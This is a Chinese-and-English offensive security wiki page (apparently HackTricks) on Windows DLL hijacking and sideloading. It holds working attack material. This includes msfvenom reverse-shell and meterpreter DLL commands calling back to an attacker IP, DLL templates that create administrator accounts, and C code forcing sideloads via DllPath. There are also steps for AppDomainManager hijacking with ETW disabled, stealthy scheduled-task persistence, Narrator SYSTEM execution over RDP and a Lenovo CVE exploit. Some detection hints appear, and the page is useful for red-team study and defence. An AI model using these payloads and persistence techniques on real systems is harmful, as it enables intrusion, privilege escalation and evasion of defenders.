# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## 基本信息

DLL Hijacking 涉及操纵一个受信任的应用程序去加载一个恶意 DLL。这个术语涵盖了几种战术，例如 **DLL Spoofing, Injection, and Side-Loading**。它主要用于代码执行、实现持久化，较少情况下用于权限提升。尽管这里重点放在提权上，但 hijacking 的方法在不同目标之间是相同的。

### 常见技术

DLL hijacking 使用了多种方法，每种方法的有效性取决于应用程序的 DLL 加载策略：

1. **DLL Replacement**：用恶意 DLL 替换真实 DLL，也可以使用 DLL Proxying 来保留原始 DLL 的功能。
2. **DLL Search Order Hijacking**：将恶意 DLL 放在搜索路径中比合法 DLL 更靠前的位置，利用应用程序的搜索顺序。
3. **Phantom DLL Hijacking**：为应用程序创建一个恶意 DLL，让它以为这是一个需要但不存在的 DLL。
4. **DLL Redirection**：修改 `%PATH%` 或 `.exe.manifest` / `.exe.local` 文件等搜索参数，把应用程序导向恶意 DLL。
5. **WinSxS DLL Replacement**：在 WinSxS 目录中用恶意 DLL 替换合法 DLL，这种方法通常与 DLL side-loading 相关。
6. **Relative Path DLL Hijacking**：把恶意 DLL 放到用户可控目录中，并与复制的应用程序一起放置，类似 Binary Proxy Execution 技术。


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Classic DLL sideloading 不是让受信任的 **.NET Framework** 进程加载攻击者代码的唯一方式。If the target executable is a **managed** application, the CLR 还会查看一个以可执行文件命名的 **application configuration file**（例如 `Setup.exe.config`）。该文件可以定义一个自定义的 **AppDomainManager**。如果 config 指向一个由攻击者控制、放在 EXE 旁边的 assembly，CLR 会在应用程序正常代码路径之前加载它，并在受信任的进程中执行。

根据 Microsoft 的 .NET Framework configuration schema，要使用自定义 manager，`<appDomainManagerAssembly>` 和 `<appDomainManagerType>` 都必须存在。

最小 config：
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
最小化管理器：
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
Practical notes:
- This is **.NET Framework specific** tradecraft. It depends on CLR config parsing, not on the Win32 DLL search order.
- The host must really be a **managed EXE**. Quick triage: `sigcheck -m target.exe`, `corflags target.exe`, or check for the **CLR Runtime Header** in PE metadata.
- The config filename must match the executable name exactly (`<binary>.config`) and usually lives **next to the EXE**.
- This is useful with **signed Microsoft/vendor binaries** because the trusted EXE remains untouched while the malicious managed assembly executes in-process.
- If you already have a writable installer/update directory, AppDomainManager hijacking can be used as the **first stage**, followed by classic DLL sideloading or reflective loading for later stages.

### Hijacking an existing scheduled task to relaunch the sideload chain

For persistence, do not only look for **creating a new task**. Some intrusion sets wait until a legitimate installer creates a **normal updater task** and then **rewrite the task action** so the existing name, author, and trigger stay familiar to defenders.

Reusable workflow:
1. Install/run the legitimate software and identify the task it normally creates.
2. Export the task XML and note the current `<Exec><Command>` / `<Arguments>` values.
3. Replace only the action so the task starts your **trusted host EXE** from a user-writable staging directory, which then side-loads or AppDomain-loads the real payload.
4. Re-register the same task name instead of creating a new obvious persistence artifact.
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
为什么它更隐蔽：
- 任务名称仍然可以看起来很合法（例如 vendor updater）。
- **Task Scheduler service** 会启动它，所以父/祖先进程验证通常会看到预期的调度链，而不是 `explorer.exe`。
- 只盯着 **new task names** 的 DFIR 团队可能会漏掉这种情况：任务注册本来就存在，但其 action 现在指向 `%LOCALAPPDATA%`、`%APPDATA%` 或其他攻击者可控路径。

快速 hunting 方向：
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- 将 `C:\Windows\System32\Tasks\*` XML 和 `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` metadata 与基线对比。
- 当一个 **vendor-looking updater task** 从 **user-writable directories** 执行，或启动一个带有同目录 `*.config` 文件的 .NET EXE 时进行告警。

> [!TIP]
> 对于一个分层使用 HTML staging、AES-CTR configs，以及在 DLL sideloading 之上叠加 .NET implants 的完整步骤链，请查看下面的 workflow。

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Finding missing Dlls

在系统中查找缺失的 Dlls，最常见的方法是从 sysinternals 运行 [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)，并**设置**以下 **2 个 filters**：

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (961).png>)

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (230).png>)

然后只显示 **File System Activity**：

![Common Techniques - Finding missing Dlls: and just show the File System Activity](<../../../images/image (153).png>)

如果你是在寻找**一般的 missing dlls**，就让它运行 **几秒钟**。\
如果你是在寻找**某个特定 executable 中缺失的 dll**，应该再设置**另一个 filter，例如 "Process Name" "contains" `<exec name>`，执行它，然后停止捕获 events**。

## Exploiting Missing Dlls

为了提升权限，我们最好的机会是能够**写入一个 privilege process 会尝试加载的 dll**，并且该 dll 位于某个**会被搜索到的位置**。因此，我们要么能够在**某个 folder** 中**写入**一个 dll，而这个 folder 的搜索优先级**早于**原始 dll 所在的 folder（特殊情况），要么能够**写入**某个会被搜索的 folder，而原始 **dll** 在任何 folder 中都**不存在**。

### Dll Search Order

在 [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **中，你可以找到 Dlls 是如何被具体加载的。**

**Windows applications** 会按照一组**预定义的搜索路径**查找 DLL，并遵循特定顺序。当恶意 DLL 被策略性地放在这些目录中的某一个时，就会发生 DLL hijacking，确保它在真正的 DLL 之前被加载。防止这一点的方法之一，是让应用程序在引用所需 DLL 时使用绝对路径。

下面是 **32-bit** 系统上的 **DLL search order**：

1. 应用程序加载的目录。
2. system directory。使用 [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) 函数获取该目录的路径。(_C:\Windows\System32_)
3. 16-bit system directory。没有函数可以获取该目录的路径，但它会被搜索。(_C:\Windows\System_)
4. Windows directory。使用 [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) 函数获取该目录的路径。
1. (_C:\Windows_)
5. 当前目录。
6. PATH environment variable 中列出的目录。注意，这不包括由 **App Paths** registry key 指定的 per-application path。计算 DLL search path 时不会使用 **App Paths** key。

这就是启用 **SafeDllSearchMode** 时的**默认**搜索顺序。当它被禁用时，当前目录会提升到第二位。要禁用此功能，创建 **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registry value 并将其设为 0（默认是启用）。

如果调用 [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) 函数并使用 **LOAD_WITH_ALTERED_SEARCH_PATH**，搜索会从 **LoadLibraryEx** 正在加载的 executable module 所在目录开始。

最后，注意 **dll 也可以通过指定 absolute path 来加载，而不只是名字**。在这种情况下，该 dll **只会在那个 path 中被搜索**（如果该 dll 还有任何 dependencies，它们会像刚通过名字加载一样被搜索）。

还有其他方式可以改变搜索顺序，但这里我不打算展开说明。

### Chaining an arbitrary file write into a missing-DLL hijack

1. 使用 **ProcMon** filters（`Process Name` = target EXE，`Path` 以 `.dll` 结尾，`Result` = `NAME NOT FOUND`）收集该进程探测但找不到的 DLL names。
2. 如果 binary 运行在 **schedule/service** 下，把一个具有这些名称之一的 DLL 放到 **application directory**（search-order 第 1 项）中，它会在下一次执行时被加载。在一个 .NET scanner 案例中，该进程会先在 `C:\samples\app\` 中寻找 `hostfxr.dll`，然后才从 `C:\Program Files\dotnet\fxr\...` 加载真正的副本。
3. 构建一个 payload DLL（例如 reverse shell），并导出任意符号：`msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. 如果你的原语是 **ZipSlip-style arbitrary write**，构造一个 ZIP，使其条目逃逸出 extraction dir，这样 DLL 就会落到 app folder 中：
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. 将压缩包投递到被监视的 inbox/share；当 scheduled task 重新启动该进程时，它会加载恶意 DLL 并以 service account 执行你的代码。

### 通过 RTL_USER_PROCESS_PARAMETERS.DllPath 强制 sideloading

一种更高级、可确定地影响新建进程 DLL 搜索路径的方法，是在使用 ntdll 的 native APIs 创建进程时，设置 RTL_USER_PROCESS_PARAMETERS 中的 DllPath 字段。通过在这里提供一个由攻击者控制的目录，目标进程如果按名称解析某个导入的 DLL（没有绝对路径，且未使用 safe loading 标志），就会被强制从该目录加载恶意 DLL。

Key idea
- 使用 RtlCreateProcessParametersEx 构建 process parameters，并提供一个指向你控制目录的自定义 DllPath（例如，dropper/unpacker 所在的目录）。
- 使用 RtlCreateUserProcess 创建进程。当目标二进制按名称解析 DLL 时，loader 会在解析过程中查询这个提供的 DllPath，从而实现可靠的 sideloading，即使恶意 DLL 不与目标 EXE 同目录。

Notes/limitations
- 这影响的是正在创建的 child process；它不同于 SetDllDirectory，后者只影响当前进程。
- 目标必须通过名称导入或 LoadLibrary 一个 DLL（没有绝对路径，且未使用 LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories）。
- KnownDLLs 和硬编码的绝对路径无法 hijack。Forwarded exports 和 SxS 可能会改变优先级。

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operational usage example
- 将一个恶意的 xmllite.dll（导出所需函数或代理到真实的那个）放到你的 DllPath 目录中。
- 启动一个已签名的 binary，该 binary 已知会使用上述 technique 按名称查找 xmllite.dll。loader 会通过提供的 DllPath 解析 import，并 sideload 你的 DLL。

This technique has been observed in-the-wild to drive multi-stage sideloading chains: an initial launcher drops a helper DLL, which then spawns a Microsoft-signed, hijackable binary with a custom DllPath to force loading of the attacker’s DLL from a staging directory.


### .NET AppDomainManager hijacking via `.exe.config`

对于 **.NET Framework** 目标，可以通过滥用应用程序旁边的 **`.exe.config`** 文件，在不 patching memory 的情况下、于 **`Main()`** 之前完成 sideloading。攻击者不再只依赖 Win32 DLL search order，而是将一个合法的 .NET EXE 放在恶意 config 旁边，并配合一个或多个由攻击者控制的 assemblies。

链条如何工作：
1. 宿主 EXE 启动，**CLR 读取 `<exe>.config`**。
2. config 设置 **`<appDomainManagerAssembly>`** 和 **`<appDomainManagerType>`**，从而让 runtime 实例化一个由攻击者控制的 `AppDomainManager`。
3. 恶意 manager 在受信任的宿主进程内获得 **pre-`Main()` execution**。
4. 同一个 config 还能强制 CLR 优先解析本地 assemblies（例如 `InitInstall.dll`、`Updater.dll`、`uevmonitor.dll`），并且在不进行 inline patching 的情况下削弱 runtime validation/telemetry。

Campaign-style pattern (exact nesting can vary by directive / CLR version):
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="Updater" />
<appDomainManagerType value="MyAppDomainManager" />
<assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
<probing privatePath="." />
<publisherPolicy apply="no" />
</assemblyBinding>
<bypassTrustedAppStrongNames enabled="true" />
<etwEnable enabled="false" />
</runtime>
<startup>
<requiredRuntime version="v4.0.30319" safemode="true" />
</startup>
</configuration>
```
Why this is useful:
- **`<probing privatePath="."/>`** keeps assembly resolution in the application directory, turning the folder into a predictable sideloading surface.
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** move execution into attacker code during CLR initialization, before the legitimate app logic runs.
- **`<bypassTrustedAppStrongNames enabled="true"/>`** can let a full-trust app load unsigned or tampered assemblies without a strong-name validation failure.
- **`<publisherPolicy apply="no"/>`** avoids publisher-policy redirects to newer assemblies.
- **`<requiredRuntime ... safemode="true"/>`** makes runtime selection more deterministic.
- **`<etwEnable enabled="false"/>`** is especially interesting because the **CLR disables its own ETW visibility** from configuration instead of the implant patching `EtwEventWrite` in memory.

Operational pattern seen in recent campaigns:
- Stage 1 drops `setup.exe`, `setup.exe.config`, and local assemblies.
- Stage 2 copies them into a believable **AppData update** folder, renames the host to something like `update.exe`, and relaunches it via a **scheduled task**.
- Stage 3 verifies execution context (for example expected parent `svchost.exe` from Task Scheduler) before loading the final RAT DLL/export.

Hunting ideas:
- Signed or otherwise legitimate **.NET executables** running with suspicious adjacent **`.config`** files in user-writable locations.
- `.config` files containing **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`**, or **`etwEnable enabled="false"`**.
- Scheduled tasks that relaunch renamed update binaries from **`%LOCALAPPDATA%`** or app-specific `\bin\update\` directories.
- Parent/child chains where a scheduled task launches a trusted .NET host that immediately loads non-vendor assemblies from its own directory.

#### Windows 文档中关于 dll 搜索顺序的例外

Windows 文档中提到了标准 DLL 搜索顺序的一些例外情况：

- 当遇到一个**与内存中已加载的某个 DLL 同名的 DLL**时，系统会绕过通常的搜索。相反，它会先检查重定向和 manifest，然后才默认使用内存中已经存在的 DLL。**在这种情况下，系统不会搜索该 DLL**。
- 如果某个 DLL 被识别为当前 Windows 版本的**known DLL**，系统会直接使用该 known DLL 及其依赖 DLL 的版本，**不会进行搜索**。注册表项 **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** 保存了这些 known DLL 的列表。
- 如果一个 **DLL 有依赖项**，这些依赖 DLL 的搜索会像它们只通过 **module name** 指定的一样进行，不管初始 DLL 是否是通过完整路径识别的。

### 提权

**要求**：

- 识别一个以**不同权限**运行或将以不同权限运行的进程（horizontal or lateral movement），并且它**缺少一个 DLL**。
- 确保对 **DLL** 将被搜索到的任何 **directory** 具有**写权限**。这个位置可能是可执行文件所在目录，或者 system path 中的某个目录。

是的，这些前提条件很难找到，因为**默认情况下，找到一个缺少 dll 的高权限可执行文件本身就很奇怪**，而且在 system path 文件夹上**拥有写权限就更奇怪了**（默认情况下你没有）。但是在配置错误的环境里这有可能发生。\
如果你运气好并且满足了这些要求，可以查看 [UACME](https://github.com/hfiref0x/UACME) 项目。即使这个项目的**主要目标是 bypass UAC**，你也可能在那里找到适用于 Windows 版本的 **Dll hijaking** 的 **PoC**，可以直接使用（可能只需要改一下你有写权限的文件夹路径）。

注意，你可以通过以下方式**检查你在某个文件夹中的权限**：
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
并且 **检查 PATH 中所有文件夹的权限**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
你也可以通过以下方式检查一个可执行文件的 imports 和一个 dll 的 exports：
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
For a full guide on how to **abuse Dll Hijacking to escalate privileges** with permissions to write in a **System Path folder** check:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)will check if you have write permissions on any folder inside system PATH.\
Other interesting automated tools to discover this vulnerability are **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ and _Write-HijackDll._

### Example

In case you find an exploitable scenario one of the most important things to successfully exploit it would be to **create a dll that exports at least all the functions the executable will import from it**. Anyway, note that Dll Hijacking comes handy in order to [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) or from[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** You can find an example of **how to create a valid dll** inside this dll hijacking study focused on dll hijacking for execution: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Moreover, in the **next sectio**n you can find some **basic dll codes** that might be useful as **templates** or to create a **dll with non required functions exported**.

## **Creating and compiling Dlls**

### **Dll Proxifying**

Basically a **Dll proxy** is a Dll capable of **execute your malicious code when loaded** but also to **expose** and **work** as **exected** by **relaying all the calls to the real library**.

With the tool [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) or [**Spartacus**](https://github.com/Accenture/Spartacus) you can actually **indicate an executable and select the library** you want to proxify and **generate a proxified dll** or **indicate the Dll** and **generate a proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**获取 meterpreter (x86)：**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**创建一个用户（x86，我没看到 x64 版本）：**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### 你自己的

请注意，在某些情况下，你编译的 Dll 必须**导出多个函数**，这些函数将由受害进程加载；如果这些函数不存在，**binary 将无法加载**它们，并且**exploit 将失败**。

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>带用户创建的 C++ DLL 示例</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>带线程入口的备用 C DLL</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## 案例研究：Narrator OneCore TTS 本地化 DLL Hijack（Accessibility/ATs）

Windows Narrator.exe 在启动时仍会探测一个可预测、语言相关的本地化 DLL，这个 DLL 可被 hijack，用于任意代码执行和持久化。

关键信息
- 探测路径（当前版本）：`%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll`（EN-US）。
- 旧路径（较早版本）：`%windir%\System32\speech\engine\tts\msttslocenus.dll`。
- 如果在 OneCore 路径下存在一个可写的、由攻击者控制的 DLL，它会被加载，并执行 `DllMain(DLL_PROCESS_ATTACH)`。不需要导出函数。

使用 Procmon 发现
- 过滤器：`Process Name is Narrator.exe` 且 `Operation is Load Image` 或 `CreateFile`。
- 启动 Narrator，并观察对上述路径的加载尝试。

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- 一个天真的 hijack 会发出声音/高亮 UI。为了保持安静，在 attach 时枚举 Narrator threads，打开主线程 (`OpenThread(THREAD_SUSPEND_RESUME)`) 并对其执行 `SuspendThread`；在你自己的线程中继续。完整代码见 PoC。

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- 使用上面的设置后，启动 Narrator 会加载植入的 DLL。在 secure desktop（logon screen）上，按 CTRL+WIN+ENTER 启动 Narrator；你的 DLL 会在 secure desktop 上以 SYSTEM 执行。

RDP-triggered SYSTEM execution (lateral movement)
- 允许 classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- 通过 RDP 连接到主机，在 logon screen 按 CTRL+WIN+ENTER 启动 Narrator；你的 DLL 会在 secure desktop 上以 SYSTEM 执行。
- RDP session 关闭后执行会停止——要尽快 inject/migrate。

Bring Your Own Accessibility (BYOA)
- 你可以克隆一个内置的 Accessibility Tool (AT) registry entry（例如 CursorIndicator），把它改成指向任意 binary/DLL，导入后再把 `configuration` 设为那个 AT 名称。这样就能通过 Accessibility framework 代理任意执行。

Notes
- 在 `%windir%\System32` 下写入以及修改 HKLM values 需要 admin rights。
- 所有 payload logic 都可以放在 `DLL_PROCESS_ATTACH` 中；不需要 exports。

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

This case demonstrates **Phantom DLL Hijacking** in Lenovo's TrackPoint Quick Menu (`TPQMAssistant.exe`), tracked as **CVE-2025-1729**.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` runs daily at 9:30 AM under the context of the logged-on user.
- **Directory Permissions**: Writable by `CREATOR OWNER`, allowing local users to drop arbitrary files.
- **DLL Search Behavior**: Attempts to load `hostfxr.dll` from its working directory first and logs "NAME NOT FOUND" if missing, indicating local directory search precedence.

### Exploit Implementation

An attacker can place a malicious `hostfxr.dll` stub in the same directory, exploiting the missing DLL to achieve code execution under the user's context:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Attack Flow

1. 作为标准用户，将 `hostfxr.dll` 放到 `C:\ProgramData\Lenovo\TPQM\Assistant\`。
2. 等待计划任务在上午 9:30 以当前用户上下文运行。
3. 如果任务执行时有管理员已登录，恶意 DLL 会在管理员会话中以 medium integrity 运行。
4. 结合标准 UAC bypass 技术，将权限从 medium integrity 提升到 SYSTEM privileges。

## Case Study: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Threat actors 常将基于 MSI 的 droppers 与 DLL side-loading 结合，借助受信任的、已签名的进程执行 payload。

Chain overview
- User 下载 MSI。一个 CustomAction 会在 GUI install 期间静默运行（例如 LaunchApplication 或 VBScript action），从嵌入式资源中重建下一阶段。
- dropper 将一个合法的、已签名的 EXE 和一个恶意 DLL 写到同一目录（示例对：Avast 签名的 wsc_proxy.exe + 攻击者控制的 wsc.dll）。
- 当启动已签名的 EXE 时，Windows DLL search order 会优先从工作目录加载 wsc.dll，从而在已签名父进程下执行攻击者代码（ATT&CK T1574.001）。

MSI analysis (what to look for)
- CustomAction table:
- 查找运行可执行文件或 VBScript 的条目。可疑模式示例：LaunchApplication 在后台执行一个嵌入文件。
- 在 Orca (Microsoft Orca.exe) 中，检查 CustomAction、InstallExecuteSequence 和 Binary tables。
- MSI CAB 中的嵌入/拆分 payload：
- Administrative extract: `msiexec /a package.msi /qb TARGETDIR=C:\out`
- 或使用 lessmsi：`lessmsi x package.msi C:\out`
- 查找多个小片段，它们会被 VBScript CustomAction 拼接并解密。常见流程：
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Practical sideloading with wsc_proxy.exe
- 将这两个文件放在同一个文件夹中：
- wsc_proxy.exe: legitimate signed host (Avast)。该进程会尝试按名称从其目录加载 wsc.dll。
- wsc.dll: attacker DLL。如果不需要特定导出，DllMain 就足够；否则，构建一个 proxy DLL，并将所需导出转发到真正的库，同时在 DllMain 中运行 payload。
- 构建一个最小的 DLL payload：
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- 对于 export requirements，使用 proxying framework（例如 DLLirant/Spartacus）生成一个 forwarding DLL，同时执行你的 payload。

- 这种 technique 依赖于 host binary 对 DLL name resolution 的方式。如果 host 使用绝对路径或 safe loading flags（例如 LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories），hijack 可能失败。
- KnownDLLs、SxS 和 forwarded exports 会影响 precedence，在选择 host binary 和 export set 时必须考虑这些因素。

## Signed triads + encrypted payloads (ShadowPad case study)

